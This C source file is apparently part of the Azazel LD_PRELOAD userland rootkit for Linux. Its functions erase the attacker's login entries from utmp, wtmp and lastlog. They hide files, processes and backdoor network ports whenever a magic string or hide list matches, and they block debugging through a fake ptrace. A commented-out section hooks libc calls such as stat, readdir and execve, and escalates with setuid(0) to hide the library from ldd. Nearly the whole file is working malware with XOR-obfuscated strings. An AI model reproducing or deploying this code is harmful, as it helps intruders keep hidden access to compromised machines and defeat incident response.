#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <limits.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <pty.h>
#include <signal.h>
#include <utmp.h>
#include <dirent.h>
#include <lastlog.h>

#define MAX_LEN 4152

#include "xor.h"
#include "const.h"
#include "azazel.h"

void cleanup(void *var, int len) {
	DEBUG("cleanup called %s\n", var);
	memset(var, 0x00, len);
	free(var);
}

int is_owner(void) {
	init();

	static int owner = -1;
	if (owner != -1)
		return owner;

	char *hide_term_str = strdup(HIDE_TERM_STR);
	x(hide_term_str);

	char *blog = strdup(BLIND_LOGIN);
	x(blog);

	char *hide_term_var = getenv(hide_term_str);

	if (hide_term_var == NULL) owner = 0;

	else if (strcmp(hide_term_var, blog) == 0) {
		char *pterm = ttyname(0);
		char *ptr = pterm+5;
		clean_wtmp(ptr,0);
		clean_utmp(ptr,0);
		owner = 1;
	}
	else
		owner = 0;


	cleanup(hide_term_str, strlen(hide_term_str));
	cleanup(blog, strlen(blog));

	return owner;
}

void clean_logz() {
        struct utmp utmp_ent, wtmp_ent;
        struct lastlog lastlog_ent, lastlog_ent2;
        memset(&lastlog_ent, 0, sizeof(lastlog_ent));

        char *wtmp_file = strdup(WTMP_FILE_X);
        char *utmp_file = strdup(UTMP_FILE_X);
        char *blind_login = strdup(BLIND_LOGIN);

        x(blind_login);
        x(wtmp_file);
        x(utmp_file);

        char *host = NULL;
        char *lastlog_file = "/var/log/lastlog";

        int fd;
        int val = 0, ver = 0, verx = 0;

        if((fd=(long)syscall_list[SYS_OPEN].syscall_func(utmp_file,O_RDWR))>=0){
                while(verx < 2) {
                        lseek(fd,0,SEEK_SET);
                        while(read(fd,&utmp_ent,sizeof(utmp_ent))>0){
                                if(!strcmp(utmp_ent.ut_name, blind_login)){
                                        if ( ver == 0 ) {
                                                host = strdup(utmp_ent.ut_host);
                                                ver = 1;
                                                FILE *fhide = syscall_list[SYS_FOPEN].syscall_func("/dev/host0", "w");
                                                fprintf(fhide, "%s", host);
                                                fclose(fhide);
                                        }
                                        memset(&utmp_ent, 0x00, sizeof(utmp_ent));
                                        lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
                                        write(fd,&utmp_ent,sizeof(utmp_ent));
                                }
                                if(host != NULL && strstr(utmp_ent.ut_host, host)) {
                                        memset(&utmp_ent, 0x00, sizeof(utmp_ent));
                                        lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
                                        write(fd,&utmp_ent,sizeof(utmp_ent));
                                }
                        }
                        verx++;
                }
                close(fd);
        }

        if(host == NULL) {
                char temp[512] = {0};
                FILE *fhide = syscall_list[SYS_FOPEN].syscall_func("/dev/host0", "r");
                if(fhide != NULL) {
                        if(fgets((char *)&temp, sizeof(temp), fhide)) host = strdup(temp);
                        fclose(fhide);
                }
        }

        if((fd=(long)syscall_list[SYS_OPEN].syscall_func(wtmp_file,O_RDWR))>=0){
                lseek(fd,0,SEEK_SET);
                while(read(fd,&wtmp_ent,sizeof(wtmp_ent))>0){
                        if(host != NULL && strstr(wtmp_ent.ut_host, host)) {
                                memset(&wtmp_ent, 0x00, sizeof(wtmp_ent));
                                lseek(fd,-(sizeof(wtmp_ent)),SEEK_CUR);
                                write(fd,&wtmp_ent,sizeof(wtmp_ent));
                        }
                        if(!strcmp(wtmp_ent.ut_name, blind_login)){
                                memset(&wtmp_ent, 0x00, sizeof(wtmp_ent));
                                lseek(fd,-(sizeof(wtmp_ent)),SEEK_CUR);
                                write(fd,&wtmp_ent,sizeof(wtmp_ent));
                        }
                        else if (!strcmp(wtmp_ent.ut_name, "root")) {
                                if(host != NULL && strstr(wtmp_ent.ut_host, host)) continue;
                                else {
                                        lastlog_ent.ll_time = wtmp_ent.ut_time;
                                        strcpy(lastlog_ent.ll_line, wtmp_ent.ut_line);
                                        strcpy(lastlog_ent.ll_host, wtmp_ent.ut_host);
                                }
                        }
                }
                close(fd);
        }

        if((fd=(long)syscall_list[SYS_OPEN].syscall_func(lastlog_file, O_RDWR)) >= 0){
                lseek(fd,0,SEEK_SET);
                while(read(fd, &lastlog_ent2, sizeof(lastlog_ent2)) > 0){
                        if(host != NULL && strstr(lastlog_ent2.ll_host, host)) {
                                memset(&lastlog_ent2, 0x00, sizeof(lastlog_ent2));
                                lseek(fd,-(sizeof(lastlog_ent2)),SEEK_CUR);
                                write(fd,&lastlog_ent,sizeof(lastlog_ent));
                        }
                }
                close(fd);
        }

        cleanup(wtmp_file, strlen(wtmp_file));
        cleanup(utmp_file, strlen(utmp_file));
        cleanup(blind_login, strlen(blind_login));
        free(host);
}

void clean_wtmp(char *pts, int verbose) {
	DEBUG("clean_wtmp\n");
	struct utmp utmp_ent;
	char *wtmp_file = strdup(WTMP_FILE_X);
	int fd;
	x(wtmp_file);
	if((fd=(long)syscall_list[SYS_OPEN].syscall_func(wtmp_file,O_RDWR))>=0){
		lseek(fd,0,SEEK_SET);
		while(read(fd,&utmp_ent,sizeof(utmp_ent))>0){
			if(strstr(utmp_ent.ut_host, pts)){
				memset(&utmp_ent,0x00,sizeof(utmp_ent));
				lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
				write(fd,&utmp_ent,sizeof(utmp_ent));
			}
		}
		close(fd);
	}
	if (verbose) {
		char *wtmp_msg = strdup(WTMP_MSG);
		x(wtmp_msg);
		printf("%s\n",wtmp_msg);
		cleanup(wtmp_msg, strlen(wtmp_msg));
	}
	cleanup(wtmp_file, strlen(wtmp_file));

        struct lastlog utmp_ent2;
        char *utmp_file = "/var/log/lastlog";

        if((fd=(long)syscall_list[SYS_OPEN].syscall_func(utmp_file,O_RDWR))>=0){
                lseek(fd,0,SEEK_SET);
                while(read(fd,&utmp_ent2,sizeof(utmp_ent2))>0){
                        if(strstr(utmp_ent2.ll_host, pts)){
                                memset(&utmp_ent2,0x00,sizeof(utmp_ent2));
                                lseek(fd,-(sizeof(utmp_ent2)),SEEK_CUR);
                                write(fd,&utmp_ent2,sizeof(utmp_ent2));
                        }
                }
                close(fd);
        }

}

void clean_utmp(char *pts, int verbose) {
	DEBUG("clean_utmp\n");
	struct utmp utmp_ent;
	char *utmp_file = strdup(UTMP_FILE_X);
	int fd;
	x(utmp_file);
	if((fd=(long)syscall_list[SYS_OPEN].syscall_func(utmp_file,O_RDWR))>=0){
		lseek(fd,0,SEEK_SET);
		while(read(fd,&utmp_ent,sizeof(utmp_ent))>0){
			if(strstr(utmp_ent.ut_host, pts)){
				memset(&utmp_ent,0x00,sizeof(utmp_ent));
				lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
				write(fd,&utmp_ent,sizeof(utmp_ent));
			}
		}
		close(fd);
	}
	if (verbose) {
		char *utmp_msg = strdup(UTMP_MSG);
		x(utmp_msg);
		printf("%s\n",utmp_msg);
		cleanup(utmp_msg, strlen(utmp_msg));
	}
	cleanup(utmp_file, strlen(utmp_file));
}

void azazel_init(void) {
	DEBUG("[-] azazel.so loaded.\n");
	int i, fd;

	if (constr)
		return;
	constr=1;

	for (i = 0; i < SYSCALL_SIZE; ++i) {
		char *scall = strdup(syscall_table[i]);
		x(scall);
		strncpy(syscall_list[i].syscall_name, scall, 50);
		syscall_list[i].syscall_func = dlsym(RTLD_NEXT, scall);
		cleanup(scall,strlen(scall));
	}
}

void init(void) {
	azazel_init();
}

long ptrace(void *request, pid_t pid, void *addr, void *data) {
	char *anti_debug_msg = strdup(ANTI_DEBUG_MSG);
	x(anti_debug_msg);
	printf("%s\n",anti_debug_msg);
	cleanup(anti_debug_msg, strlen(anti_debug_msg));
	exit(-1);
}

int parse_environ(char *stack, int len, char *needle) {
	DEBUG("parse_environ\n");
	char *step = stack;

	while(1) {
		if (strstr(step,needle))
			return 1;
		if (*step+1 != '\0') {
			step++;
			if (step-stack >= len) {
				return 0;
			}
		} else
			return 0;
	}
}

int is_invisible(const char *path) {
	DEBUG("is_invisible\n");
	struct stat s_fstat;
	char line[MAX_LEN];
	char p_path[PATH_MAX];
	char *config_file = strdup(CONFIG_FILE);
	FILE *cmd;
	int fd;

	init();

	x(config_file);

	if(strstr(path, MAGIC_STRING) || strstr(path, config_file)) {
		cleanup(config_file, strlen(config_file));
		return 1;
	}

	char *hfpath = strdup(HIDE_F_PATH);
	x(hfpath);
	FILE *hf = syscall_list[SYS_FOPEN].syscall_func(hfpath, "r");
	if(hf) {
		int res1;
		char nl[1024] = {0};
		while((res1=fgets(nl, 1024, hf) != NULL)) {
			if(nl[strlen(nl) - 1] == '\n') nl[strlen(nl) - 1] = '\0';
			if(strstr(path, nl)) {
				cleanup(config_file, strlen(config_file));
				cleanup(hfpath, strlen(hfpath));
				fclose(hf);
				return 1;
			}
		}
		fclose(hf);
	}

	char *proc_path = strdup(PROC_PATH);
	x(proc_path);
	if(strstr(path, proc_path)){
		cleanup(proc_path,strlen(proc_path));
		if((long) syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, &s_fstat) != -1){
                        char *env_line = strdup(ENV_LINE);
                        x(env_line);
                        snprintf(p_path, PATH_MAX, env_line, path);
                        cleanup(env_line, strlen(env_line));
                        if((long)(syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, p_path, &s_fstat)) != -1){
                                cmd = syscall_list[SYS_FOPEN].syscall_func(p_path, "r");
                                if(cmd){
                                        char *hide_term_str = strdup(HIDE_TERM_STR);
                                        x(hide_term_str);
                                        int res;
                                        char *step = &line[0];
                                        while((res=fgets(line, MAX_LEN, cmd) != NULL)) {
                                                if (parse_environ(line, MAX_LEN, hide_term_str) == 1 || parse_environ(line, MAX_LEN, MAGIC_STRING)) {
                                                        cleanup(config_file, strlen(config_file));
                                                        cleanup(hide_term_str, strlen(hide_term_str));
                                                        fclose(cmd);
                                                        return 1;
                                                }

                                                memset(line,0x00,MAX_LEN);
                                        }
                                        fclose(cmd);
                                }
                        }

                        char *cmd_line = strdup(CMD_LINE);
                        x(cmd_line);
                        memset(p_path, 0, PATH_MAX);
                        snprintf(p_path, PATH_MAX, cmd_line, path);
                        cleanup(cmd_line,strlen(cmd_line));

                        if((long)(syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, p_path, &s_fstat)) != -1){
                                cmd = syscall_list[SYS_FOPEN].syscall_func(p_path, "r");
                                if(cmd){
                                        char *hide_term_str = strdup(HIDE_TERM_STR);
                                        x(hide_term_str);
                                        int res;
                                        char *step = &line[0];
                                        while((res=fgets(line, MAX_LEN, cmd) != NULL)) {
                                                if (parse_environ(line, MAX_LEN, hide_term_str) == 1 || parse_environ(line, MAX_LEN, MAGIC_STRING) || strstr(line, MAGIC_STRING)) {
                                                        cleanup(config_file, strlen(config_file));
                                                        cleanup(hide_term_str, strlen(hide_term_str));
                                                        fclose(cmd);
                                                        return 1;
                                                }

                                                memset(line,0x00,MAX_LEN);
                                        }
                                        fclose(cmd);
                                }
                        }
		}
	} else {
		cleanup(proc_path,strlen(proc_path));
	}
	cleanup(config_file,strlen(config_file));
	return 0;
}

int is_procnet(const char *filename) {
	DEBUG("is_procnet\n");
	char *proc_net_tcp = strdup(PROC_NET_TCP);
	char *proc_net_tcp6 = strdup(PROC_NET_TCP6);
	x(proc_net_tcp);
	x(proc_net_tcp6);

	if (strcmp (filename, proc_net_tcp) == 0
		|| strcmp (filename, proc_net_tcp6) == 0) {
		cleanup(proc_net_tcp,strlen(proc_net_tcp));
		cleanup(proc_net_tcp6,strlen(proc_net_tcp6));
		return 1;
	}

	cleanup(proc_net_tcp,strlen(proc_net_tcp));
	cleanup(proc_net_tcp6,strlen(proc_net_tcp6));
	return 0;
}

FILE *hide_ports(const char *filename) {
	DEBUG("hide_ports called\n");
	char line[LINE_MAX];
	char *proc_net_tcp = strdup(PROC_NET_TCP);
	char *proc_net_tcp6 = strdup(PROC_NET_TCP6);

	init();
	x(proc_net_tcp);
	x(proc_net_tcp6);

	unsigned long rxq, txq, time_len, retr, inode;
	int local_port, rem_port, d, state, uid, timer_run, timeout;
	char rem_addr[128], local_addr[128], more[512];

	FILE *tmp = tmpfile();
	FILE *pnt = syscall_list[SYS_FOPEN].syscall_func(filename, "r"); 

	while (fgets(line, LINE_MAX, pnt) != NULL) {
		int val = 0;
		char *scanf_line = strdup(SCANF_LINE);
		x(scanf_line);
		sscanf(line,
    			scanf_line,
		 	&d, local_addr, &local_port, rem_addr, &rem_port, &state,
		 	&txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout, &inode, more);
		cleanup(scanf_line,strlen(scanf_line));

                struct in_addr ip_addr;
                char *retx;
                ip_addr.s_addr = strtoul(rem_addr, &retx, 16);

        	char *hfpath = strdup(HIDE_P_PATH);
	        x(hfpath);
        	FILE *hf = syscall_list[SYS_FOPEN].syscall_func(hfpath, "r");
	        if(hf) {
        	        int res1;
	                char nl[1024] = {0};
                	while((res1=fgets(nl, 1024, hf) != NULL)) {
        	                if(nl[strlen(nl) - 1] == '\n') nl[strlen(nl) - 1] = '\0';
				if(strstr(inet_ntoa(ip_addr), nl) || rem_port == atoi(nl))
	                                val = 1;
                	}
        	        fclose(hf);
	        }
		cleanup(hfpath, strlen(hfpath));

		if((rem_port >= LOW_PORT && rem_port <= HIGH_PORT) || (rem_port >= CRYPT_LOW && rem_port <= CRYPT_HIGH) || (rem_port == PAM_PORT) || (val == 1)){
			continue;
		} else{
			if((local_port >= LOW_PORT && local_port <= HIGH_PORT) || (local_port >= CRYPT_LOW && local_port >= CRYPT_HIGH) || (local_port == PAM_PORT) || (val == 1)){
				continue;
			}else{
				fputs(line, tmp);
			}
		}
	}

	cleanup(proc_net_tcp,strlen(proc_net_tcp));
	cleanup(proc_net_tcp6,strlen(proc_net_tcp6));
	fclose(pnt);
	fseek(tmp, 0, SEEK_SET);
	return tmp;
}
/*
int access(const char *path, int amode) {
	DEBUG("access hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_ACCESS].syscall_func(path, amode);

	if(is_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_ACCESS].syscall_func(path,amode);
}

FILE *fopen (const char *filename, const char *mode) {
	DEBUG("fopen hooked %s.\n", filename);
	if (is_owner()) 
		return syscall_list[SYS_FOPEN].syscall_func(filename, mode);

	if (is_procnet(filename))
		return hide_ports(filename);

	if (is_invisible(filename)) {
		errno = ENOENT;
		return NULL;
	}

	return syscall_list[SYS_FOPEN].syscall_func(filename, mode);
}

FILE *fopen64 (const char *filename, const char *mode) {
	DEBUG("fopen hooked %s.\n", filename);
	if (is_owner()) 
		return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);

	if (is_procnet(filename))
		return hide_ports(filename);

	if (is_invisible(filename)) {
		errno = ENOENT;
		return NULL;
	}

	return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);
}

int lstat(const char *file, struct stat *buf) {
	DEBUG("lstat hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_LXSTAT].syscall_func(_STAT_VER, file, buf);

	if(is_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_LXSTAT].syscall_func(_STAT_VER, file, buf);
}

int lstat64(const char *file, struct stat64 *buf) {
	DEBUG("lstat64 hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_LXSTAT64].syscall_func(_STAT_VER, file, buf);

	if (is_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_LXSTAT64].syscall_func(_STAT_VER, file, buf);
}

int __lxstat(int ver, const char *file, struct stat *buf) {
	DEBUG("__lxstat hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_LXSTAT].syscall_func(ver, file, buf);

	if (is_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_LXSTAT].syscall_func(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf) {
	DEBUG("__lxstat64 hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_LXSTAT64].syscall_func(ver, file, buf);

	if(is_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_LXSTAT64].syscall_func(ver, file, buf);
}

int open(const char *pathname, int flags, mode_t mode) {
	DEBUG("open hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_OPEN].syscall_func(pathname, flags, mode);

	if(is_invisible(pathname)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_OPEN].syscall_func(pathname,flags,mode);
}

int open64(const char *pathname, int flags, mode_t mode) {
        int (*r_open64) (const char *, int, mode_t);
        r_open64 = dlsym(RTLD_NEXT, "open64");

        DEBUG("open hooked.\n");
        if (is_owner())
                return (long)r_open64(pathname, flags, mode);

        if(is_invisible(pathname)) {
                errno = ENOENT;
                return -1;
        }

        return (long)r_open64(pathname, flags, mode);
}

int rmdir(const char *pathname) {
	DEBUG("rmdir hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_RMDIR].syscall_func(pathname);

	if(is_invisible(pathname)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_RMDIR].syscall_func(pathname);
}

int stat(const char *path, struct stat *buf) {
	DEBUG("stat hooked\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);
	
	if(is_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);
}

int stat64(const char *path, struct stat64 *buf) {
	DEBUG("stat64 hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);
	
	if(is_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_XSTAT64].syscall_func(_STAT_VER, path, buf);
}

int __xstat(int ver, const char *path, struct stat *buf) {
	DEBUG("xstat hooked. path: %s\n",path);
	if (is_owner()) 
		return (long)syscall_list[SYS_XSTAT].syscall_func(ver, path, buf);
	
	if(is_invisible(path)) {
		DEBUG("File is invisble.\n");
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_XSTAT].syscall_func(ver,path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf) {
	DEBUG("xstat64 hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_XSTAT64].syscall_func(ver, path, buf);

	if(is_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_XSTAT64].syscall_func(ver,path, buf);
}

int unlink(const char *pathname) {
	DEBUG("unlink hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_UNLINK].syscall_func(pathname);

	if(is_invisible(pathname)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_UNLINK].syscall_func(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags) {
	DEBUG("unlinkat hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);

	if(is_invisible(pathname)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);
}

DIR *opendir(const char *name) {
	DEBUG("opendir hooked.\n");
	if (is_owner()) 
		return syscall_list[SYS_OPENDIR].syscall_func(name);

	if(is_invisible(name)) {
		errno = ENOENT;
		return NULL;
	}

	return syscall_list[SYS_OPENDIR].syscall_func(name);
}

struct dirent *readdir(DIR *dirp) {
	DEBUG("readdir hooked.\n");
	if (is_owner()) 
		return syscall_list[SYS_READDIR].syscall_func(dirp);
	struct dirent *dir;
	do {
		dir = syscall_list[SYS_READDIR].syscall_func(dirp);

		if (dir != NULL && (strcmp(dir->d_name,".\0") || strcmp(dir->d_name,"/\0"))) 
			continue;

		if(dir != NULL) {
			char path[PATH_MAX + 1];
			char *proc_str = strdup(PROC_STR);
			x(proc_str);
			snprintf(path, PATH_MAX, proc_str, dir->d_name);
			cleanup(proc_str,strlen(proc_str));

			if(is_invisible(path) || strstr(path, MAGIC_STRING)) {
				continue;
			}
		}

	} while(dir && is_invisible(dir->d_name));

	return dir;
}

struct dirent64 *readdir64(DIR *dirp) {
	DEBUG("readdir64 hooked.\n");
	if (is_owner()) 
		return syscall_list[SYS_READDIR64].syscall_func(dirp);
	struct dirent64 *dir;
	do {
		dir = syscall_list[SYS_READDIR64].syscall_func(dirp);

		if (dir != NULL && (strcmp(dir->d_name,".\0") || strcmp(dir->d_name,"/\0"))) 
			continue;

		if(dir != NULL) {
			char path[PATH_MAX + 1];
			char *proc_str = strdup(PROC_STR);
			x(proc_str);
			snprintf(path, PATH_MAX, proc_str, dir->d_name);
			cleanup(proc_str,strlen(proc_str));

			if(is_invisible(path) || strstr(path, MAGIC_STRING)) {
				continue;
			}
		}

	} while(dir && is_invisible(dir->d_name));
	return dir;
}

int link(const char *oldpath, const char *newpath) {
	DEBUG("link hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_LINK].syscall_func(oldpath, newpath);

	if(is_invisible(oldpath)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_LINK].syscall_func(oldpath, newpath);
}

int execve(const char *path, char *const argv[], char *const envp[]) {
	DEBUG("execve hooked. path: %s\n",path);
	char *unhide = strdup(C_UNHIDE);
	char *ldd = strdup(C_LDD);
	char *ld_linux = strdup(LD_LINUX);
	char *ld_trace = strdup(LD_TRACE);
	x(ld_trace);
	char *trace_var = getenv(ld_trace);
	cleanup(ld_trace,strlen(ld_trace));

	char buf[65535];
	int pid, ret;
	int child_stdin[2];
	int child_stdout[2];

	init();
	clean_logz();
	x(unhide);
	x(ldd);
	x(ld_linux);

	char *cleanup_str = strdup(CLEANUP_LOGS);
	x(cleanup_str);
	char *cleanvar = getenv(cleanup_str);

	if (cleanvar != NULL) {
		clean_utmp(cleanvar, 1);
		clean_wtmp(cleanvar, 1);

		unsetenv(cleanup_str);
		cleanup(cleanup_str, strlen(cleanup_str));
		cleanup(unhide, strlen(unhide));
		cleanup(ldd,strlen(ldd));
		cleanup(ld_linux,strlen(ld_linux));
		exit(0);
	}
	cleanup(cleanup_str, strlen(cleanup_str));

	if (strstr(path, ldd) || strstr(path, ld_linux) || trace_var != NULL || strstr(path, unhide)) { 
		uid_t oid= getuid(); // This method will be changed in the next version.
		char *ld_normal = strdup(LD_NORMAL);
		char *ld_hide = strdup(LD_HIDE);
		x(ld_normal);
		x(ld_hide);

		setuid(0);
		rename(ld_normal, ld_hide);
		if ((pid=fork()) == -1) {
			cleanup(ld_normal, strlen(ld_normal));
			cleanup(ld_hide, strlen(ld_hide));
			return -1;
		} else if (pid == 0) {
			cleanup(ld_normal, strlen(ld_normal));
			cleanup(ld_hide, strlen(ld_hide));
			return (long)syscall_list[SYS_EXECVE].syscall_func(path, argv, NULL);
		} else {

		}
		wait(&ret);

		rename(ld_hide, ld_normal);
		setuid(oid);
		cleanup(ld_normal, strlen(ld_normal));
		cleanup(ld_hide, strlen(ld_hide));
	} else {
		ret = (long)syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
	}

	cleanup(unhide,strlen(unhide));
	cleanup(ldd,strlen(ldd));
	cleanup(ld_linux,strlen(ld_linux));
	exit(ret);
}
*/
